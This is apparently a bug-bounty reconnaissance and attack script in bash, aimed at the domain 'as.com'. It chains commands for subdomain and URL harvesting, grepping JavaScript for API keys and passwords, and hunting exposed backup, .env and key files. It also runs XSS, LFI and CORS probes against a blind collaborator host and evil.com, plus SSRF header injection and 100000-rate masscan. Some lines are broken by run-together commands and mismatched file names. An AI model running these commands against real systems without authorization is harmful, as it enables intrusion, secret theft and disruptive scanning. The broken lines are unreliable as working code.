#!/bin/bash

# Subdomain Enumeration
target="as.com"

subfinder -d $target -all -recursive >> subas.com.txt

cat subas.com.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 >> subas.coms_alive.txt

subzy run --targets subas.coms.txt --concurrency 100 --hide_fails --verify_ssl

# Subdomain Enumeration

katana -u subas.coms_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

echo $target | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txtkatana -u https://$target -d 5 | grep '=' | urldedupe | anew output.txtcat output.txt | sed 's/=.*/=/' >final.txt

echo $target | gau --mc 200 | urldedupe >urls.txtcat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txtcat output.txt | sed 's/=.*/=/' >final.txt

# Subdomain Enumeration

cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"

site:*.$target (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)

cat as.coms.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe

echo https://$target | gau | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"

s3scanner scan -d $target

cat allurls.txt | grep -E "\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"

# XSS Testing

echo https://$target/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt

cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence

cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high

cat js_files.txt | Gxss -c 100 | sort -u | dalfox pipe -o dom_xss_results.txt

# LFI Testing

echo "https://$target/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v

# CORS Testing

curl -H "Origin: http://$target" -I https://$target/wp-json/

python3 CORScanner.py -u https://$target -d -t 10

cat as.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt

curl -H "Origin: https://evil.com" -I https://$target/api/data | grep -i "access-control-allow-origin: https://evil.com"

# WordPress Scanning

wpscan --url https://$target --disable-tls-checks --api-token YOUR_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force

# Browser Extensions

https://github.com/1hehaq/greb

https://addons.mozilla.org/en-US/firefox/addon/trufflehog/

https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/

https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/

https://addons.mozilla.org/en-US/firefox/addon/temp-mail/

https://addons.mozilla.org/en-US/firefox/addon/hunterio/

https://addons.mozilla.org/en-US/firefox/addon/hacktools/

https://addons.mozilla.org/en-US/firefox/addon/edit-cookie/

https://addons.mozilla.org/en-US/firefox/addon/happy-bonobo-disable-webrtc/

https://addons.mozilla.org/en-US/firefox/addon/link-gopher/

https://addons.mozilla.org/en-US/firefox/addon/findsomething/

https://addons.mozilla.org/en-US/firefox/addon/dotgit/

https://addons.mozilla.org/en-US/firefox/addon/open-multiple-urls/

https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/

https://addons.mozilla.org/en-US/firefox/addon/darkreader/

https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/

https://addons.mozilla.org/en-US/firefox/addon/retire-js/

https://addons.mozilla.org/en-US/firefox/addon/traduzir-paginas-web/

https://addons.mozilla.org/en-US/firefox/addon/waybackurl/

https://addons.mozilla.org/es-ES/firefox/addon/shodan-addon/

# Network Scanning

naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt

nmap -p- --min-rate 1000 -T4 -A $target -oA fullscan

masscan -p0-65535 $target --rate 100000 -oG masscan-results.txt

# Parameter Discovery

arjun -u https://$target/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

arjun -u https://$target/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"

# JavaScript Analysis

echo $target | katana -d 5 | grep -E "\.js$" | nuclei -t /path/to/nuclei-templates/http/exposures/ -c 30

cat alljs.txt | nuclei -t /path/to/nuclei-templates/http/exposures/

# Content Type Filtering

echo $target | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'

echo $target | gau | grep '\.js-php-jsp-other extens$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'

# Shodan Dorks

Ssl.cert.subject.CN:"$target" 200

# FFUF Request File Method

ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"

ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"

# Advanced Techniques

cat $targets.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ""\n";done

